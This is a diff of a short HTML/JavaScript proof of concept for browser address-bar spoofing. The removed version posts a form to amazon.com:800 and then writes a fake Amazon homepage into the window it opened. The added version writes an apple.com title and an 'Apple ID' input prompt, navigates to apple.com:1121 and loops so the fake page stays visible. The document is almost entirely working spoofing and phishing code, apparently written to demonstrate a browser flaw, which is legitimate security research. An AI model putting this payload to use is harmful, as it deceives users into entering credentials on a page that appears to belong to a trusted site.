@@ -1,34 +1,22 @@
-<!DOCTYPE HTML>
-<html>
-
-<head>
-
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-
-</head>
-
-<body>
-
-    <form action="http://amazon.com:800" target="aa" method="post" onsubmit="setTimeout('p()',1000);">
-        
-<input type="submit">
-
-</form>
-
 <script>
+function spoof()
 
-function p() {
+{
 
-  var t = window.open('','aa');
+document.write("<title>www.apple.com</title>");
+  
+    a= '<h1>Fake Content!!</h1><p>Please input your Apple ID here:<input></p>'
 
-    t.document.body.innerHTML = '<h1>Fake amazon Homepage!</h1>';
+document.write(a);
+window.location.assign("http://www.apple.com:1121");
 
-  t.stop();
+   	setTimeout(function(){
+		spoof();  // Loop makes the browser always shows the fake page.
+	}, 2000);
 
 }
 
+
+
+setInterval(spoof(),2000);
 </script>
-
-</body>
-
-</html>
